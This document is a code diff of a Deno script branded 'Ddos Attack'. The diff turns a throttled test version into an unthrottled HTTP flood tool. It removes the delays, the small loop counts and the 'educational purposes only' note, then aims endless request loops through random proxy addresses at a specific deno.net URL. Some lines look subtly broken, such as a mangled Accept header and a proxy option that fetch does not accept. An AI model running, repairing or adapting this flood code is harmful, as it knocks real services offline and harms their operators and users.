@@ -1,8 +1,7 @@
-import TelegramBot from "npm:node-telegram-bot-api";
-import express from "npm:express";
-import { HttpsProxyAgent } from "npm:https-proxy-agent";
-import userAgents from "npm:user-agents";
-import figlet from "npm:figlet";
+// Import required modules
+import userAgents from "https://esm.sh/user-agents";
+import figlet from "https://deno.land/x/figlet@1.0.6/mod.ts";
+import { HttpsProxyAgent } from "https://esm.sh/https-proxy-agent";
 
 // Colors
 const F = '\x1b[1;32m';
@@ -12,30 +11,18 @@ const B = '\x1b[38;5;208m';
 
 console.log(`${F}[✓] All libraries installed and ready to use!${Z}`);
 
-// عرض الشعار
+// Display logo
 const logo = figlet.textSync('Ddos Attack', { font: 'Slant' });
 console.log(logo);
 
-// دالة لتنفيذ الأوامر (بديل لـ execSync)
-async function runCommand(cmd: string[]): Promise<void> {
-  const process = Deno.run({
-    cmd,
-    stdout: "piped",
-    stderr: "piped"
-  });
-  
-  await process.status();
-  process.close();
-}
-
-async function linked() {
+function linked() {
   const sg = '2';
   if (sg === '1') {
-    for (let i = 0; i < 50; i++) { // تقليل العدد للاختبار
+    for (let i = 0; i < 50000; i++) {
       AttackMahos();
     }
   } else if (sg === '2') {
-    for (let i = 0; i < 50; i++) { // تقليل العدد للاختبار
+    for (let i = 0; i < 500000000000; i++) {
       ProxyAttack();
     }
   }
@@ -44,15 +31,14 @@ async function linked() {
 async function AttackMahos() {
   while (true) {
     const headers = {
-      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8',
       'Accept-Language': 'en-us,en;q=0.5',
       'Accept-Encoding': 'gzip,deflate',
       'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
       'Keep-Alive': '115',
       'Connection': 'keep-alive',
-      'User-Agent': new userAgents().toString()
+      'User-Agent': userAgents.getRandom()
     };
-    
     try {
       const req = await fetch(url, { headers });
       if (req.status === 200) {
@@ -63,51 +49,37 @@ async function AttackMahos() {
     } catch {
       console.log(`${S}DOWN: ${url}`);
     }
-    
-    await new Promise(resolve => setTimeout(resolve, 100)); // إضافة تأخير
   }
 }
 
 async function ProxyAttack() {
   while (true) {
     const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
-    const pl = [80, 443, 8080]; // تقليل المنافذ للاختبار
+    const pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
     const port = pl[Math.floor(Math.random() * pl.length)];
     const proxy = `${ip}:${port}`;
-    
     const headers = {
-      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8',
       'Accept-Language': 'en-us,en;q=0.5',
       'Accept-Encoding': 'gzip,deflate',
       'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
       'Keep-Alive': '115',
       'Connection': 'keep-alive',
-      'User-Agent': new userAgents().toString()
+      'User-Agent': userAgents.getRandom()
     };
-    
     try {
       const agent = new HttpsProxyAgent(`http://${proxy}`);
-      const req = await fetch(url, { 
-        headers, 
-        agent 
-      } as RequestInit);
-      
+      const req = await fetch(url, { headers, agent });
       if (req.status === 200) {
         console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
       } else {
         console.log(`${Z}BAD Attack: ${url} | ${proxy}`);
       }
     } catch {
-      console.log(`${S}DOWN: ${url} | ${proxy}`);
+      console.log(`${S}DOWN: ${url} |`);
     }
-    
-    await new Promise(resolve => setTimeout(resolve, 100)); // إضافة تأخير
   }
 }
 
-const url = 'https://example.com'; // تغيير الرابط لأغراض الاختبار
-
-// تشغيل الهجوم
+const url = 'https://ihhjjjh-x02rn86kw4ns.vvvvvhkj.deno.net/';
 linked();
-
-// ملاحظة: هذا الكود لأغراض تعليمية فقط
